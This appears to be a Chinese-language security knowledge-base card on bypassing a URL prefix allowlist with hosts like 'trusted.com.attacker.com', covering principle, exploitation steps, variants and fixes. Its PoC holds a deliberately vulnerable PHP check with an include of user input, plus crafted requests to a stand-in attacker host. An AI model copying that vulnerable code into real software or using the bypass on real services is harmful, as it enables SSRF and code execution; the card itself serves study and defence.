---
id: web-generic-ssrf-hostname-subdomain-prefix-allowlist-bypass
title: URL 前缀白名单被 trusted.com.attacker.com 绕过：字符串前缀匹配不等于主机校验
type: scenario
domain: web
path: web/generic/ssrf
technique: url-subdomain-prefix-allowlist-bypass
tags:
- web
- ssrf
- allowlist-bypass
- url-parsing
- subdomain
- prefix-match
- php
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V277
  verified_at: '2026-11-07T23:11:37+08:00'
  notes: 已对照原文与17张图：源码 strpos($challenge,'http://jasmineaura.github.io')!==0 前缀校验与卡内原理一致；原文实际通关用 userinfo(@127.0.0.1) 与 nginx access.log 包含，子域名前缀构造仅在正文文字说明、无独立成功截图，卡已标为通用机制；未对真实目标实测。
url: /docs/web/generic/ssrf/web-generic-ssrf-hostname-subdomain-prefix-allowlist-bypass/
draft: false
kb_aliases:
- 前缀白名单子域名绕过
- strpos URL 检查绕过
- trusted.com.attacker.com
- 子域名前缀匹配
- URL startsWith 白名单
---

## 一句话结论

服务端用 `strpos($url, 'http://trusted.com') === 0`、`startswith('https://trusted.com')` 或简单正则做 URL 白名单时，攻击者传入 `http://trusted.com.attacker.com/payload` 即可通过前缀检查：字符串确实以可信域名开头，但真实主机是攻击者控制的 `trusted.com.attacker.com`，服务端抓取到的内容完全由攻击者决定。

## 原理

- **字符串前缀不等于主机**：`strpos($url, $prefix) === 0` 只比较字节前缀。`http://trusted.com.attacker.com/` 的前缀 `http://trusted.com` 命中，但按 URL 语义 host 是 `trusted.com.attacker.com`，属于攻击者的域名。
- **DNS 控制**：攻击者只需控制 `attacker.com`，为其添加一条 `trusted.com.attacker.com` 的 A/CNAME 记录（子域名可以任意命名），即可让该 URL 解析到自己的服务器并返回任意内容。可信域名只是攻击者域名的一个标签，并不表示服务器属于可信方。
- **与 userinfo 混淆的区别**：`http://trusted.com@evil.com` 是把可信域名放在 userinfo、真实主机在 `@` 后；本卡是可信域名作为主机名的前缀标签（`trusted.com.evil.com`），不需要 `@`，对只检查字符串前缀的过滤器同样有效。
- **为什么危险**：凡是“先取回 URL 内容再信任”的逻辑（远程文件包含、URL 预览、Webhook 校验、白名单抓取、SSRF 防护）都会把攻击者内容当成可信来源；若返回内容被 `include`/`eval`/反序列化，可升级为 RCE。

## 触发条件

- 服务端接受用户提供的 URL，并用字符串前缀/`startswith`/`strpos`/简单正则做白名单。
- 校验只看完整 URL 字符串，没有 `parse_url` 后比较 hostname，也没有校验 DNS 解析结果/IP。
- 攻击者能控制一个域名，并在其下创建以可信域名为前缀标签的子域名。
- 服务端会实际请求该 URL（`file_get_contents`、curl、requests、HttpClient 等），且未禁止外连。

## 利用步骤

1. 找到接受 URL 的参数与白名单逻辑，确认检查是 `strpos(...) === 0`、`startswith` 或正则前缀，而不是 `parse_url($url, PHP_URL_HOST) === 'trusted.com'`。
2. 在自己的域名下创建子域名 `trusted.com.attacker.com`，指向攻击者服务器。
3. 在服务器上放置满足下一层校验的内容（例如 `file_get_contents($url)` 后要求包含某段文字，或被 `include` 的 PHP 代码）。
4. 提交 `http://trusted.com.attacker.com/payload`：字符串前缀通过，DNS 解析到攻击者服务器，服务端取回攻击者内容。
5. 若后续是文件包含/反序列化/模板渲染，将 payload 升级为 RCE；若只是内容校验，可用来伪造“可信来源”内容或进一步 SSRF。

## PoC

```php
<?php
// 有漏洞的校验：只看字符串前缀
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0) {
    die('not trusted');
}
$content = file_get_contents($challenge);   // 实际请求 trusted.com.attacker.com
if (strpos($content, 'expected-marker') === false) {
    die('content check failed');
}
include($_POST['gift']);                    // 后续可利用的包含点
```

```text
# 攻击者 DNS（attacker.com 由攻击者控制）：
trusted.com.attacker.com.  A  203.0.113.10

# 请求：
challenge=http://trusted.com.attacker.com/payload.txt
# strpos 检查通过；file_get_contents 取回攻击者服务器上的 payload.txt
```

```http
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

challenge=http%3A%2F%2Ftrusted.com.attacker.com%2Fpayload.txt
```

## 变体与关联

- **userinfo 变体**：`http://trusted.com@evil.com`——可信域名在 userinfo，真实主机是 `evil.com`；见 [[web-generic-ssrf-url-userinfo-prefix-allowlist-bypass]]。
- **后缀/包含变体**：`http://evil.com/trusted.com`、`http://evil.com/?trusted.com`、`http://trusted.com.evil.com`、`http://trusted.com%2eevil.com`（取决于解码顺序）、`http://trusted.com:80@evil.com`；还有尾部点 `trusted.com.` 与 IDN 同形字。
- **DNS 重绑定变体**：先解析到可信 IP 通过校验，再重绑定到内网/攻击者 IP；或利用 CNAME 指向攻击者。
- **开放重定向变体**：白名单 URL 本身可信，但通过重定向跳到攻击者；需要每跳重新校验。
- **关联卡片**：[[web-generic-ssrf-url-parser-differential-allowlist-bypass]]（解析器分歧）、[[web-generic-ssrf-url-userinfo-prefix-allowlist-bypass]]（userinfo 混淆）、[[web-php-file-inclusion-access-log-poisoning-webshell]]（取回内容后 includes 的后续利用）、[[web-php-file-inclusion-data-wrapper-short-tag-rce]]（data:// 满足内容检查）。
- **边界**：若校验用 `parse_url`/`URL` 解析后严格比较 hostname（等于 trusted.com 或以 `.trusted.com` 结尾），或对 DNS/IP 做二次校验，本链不成立；若服务端禁止出网，也无法取回攻击者内容。

## 检测与防御

- **修复**：用标准 URL 解析器取 hostname；白名单比较必须“完全等于 trusted.com”或“以 `.trusted.com` 结尾”，不能做字符串前缀匹配；拒绝 userinfo、非常规端口和非 http/https。
- **加固**：请求前解析 DNS 并校验 IP 不属于回环/私网/链路本地；禁止跟随重定向或每跳重新校验；对取回内容做类型/长度限制，不要直接 `include`/`eval`。
- **检测**：URL 参数中出现 `trusted.com.`、`trusted.com@`、`trusted.com%2e`、`trusted.com:port@` 等形态；DNS 日志出现可信域名作为子域名标签的解析；服务端向新注册/低信誉域名发起请求。
- **审计**：搜索代码中的 `strpos($url`、`startswith(`、`startsWith(`、`preg_match('#^https?://trusted` 等前缀校验；统一替换为解析后 hostname 比较。
